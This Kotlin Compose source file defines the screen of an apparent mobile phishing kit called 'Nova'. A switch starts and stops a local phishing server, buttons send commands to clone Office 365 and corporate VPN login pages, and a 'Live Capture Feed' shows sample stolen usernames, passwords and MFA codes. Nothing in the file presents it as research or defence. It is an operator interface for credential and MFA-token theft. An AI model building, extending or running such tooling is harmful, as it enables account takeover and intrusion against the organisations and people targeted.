package com.spartanai.nova.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import com.spartanai.nova.core.NovaOrchestrator

@Composable
fun PhishingScreen() {
    val orchestrator = NovaOrchestrator.getInstance()
    var isServerActive by remember { mutableStateOf(false) }
    val capturedData = listOf(
        "USER: admin | PASS: p@ssword123 | TARGET: Corporate VPN",
        "USER: target@corp.com | MFA: 554321 | TARGET: O365"
    )

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Text("Active Phishing Hub", style = MaterialTheme.typography.headlineMedium)
        Text("Sovereign Hosting & Token Capture", style = MaterialTheme.typography.bodySmall)

        Spacer(modifier = Modifier.height(24.dp))

        Card(modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier.padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column {
                    Text("Local Server", style = MaterialTheme.typography.titleMedium)
                    Text("Port: 8080 | SSL: ACTIVE", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                }
                Switch(checked = isServerActive, onCheckedChange = { 
                    isServerActive = it
                    orchestrator.executeCommand(if (it) "phish start" else "phish stop")
                })
            }
        }

        Spacer(modifier = Modifier.height(24.dp))

        Text("Live Capture Feed", style = MaterialTheme.typography.titleMedium)
        LazyColumn(modifier = Modifier.weight(1f)) {
            items(capturedData) { data ->
                Card(
                    modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Text(
                        text = data,
                        modifier = Modifier.padding(12.dp),
                        style = MaterialTheme.typography.bodyMedium,
                        color = Color.Green
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
            Button(onClick = { orchestrator.executeCommand("phish clone-o365") }) {
                Text("CLONE O365")
            }
            Button(onClick = { orchestrator.executeCommand("phish clone-vpn") }) {
                Text("CLONE VPN")
            }
        }
    }
}
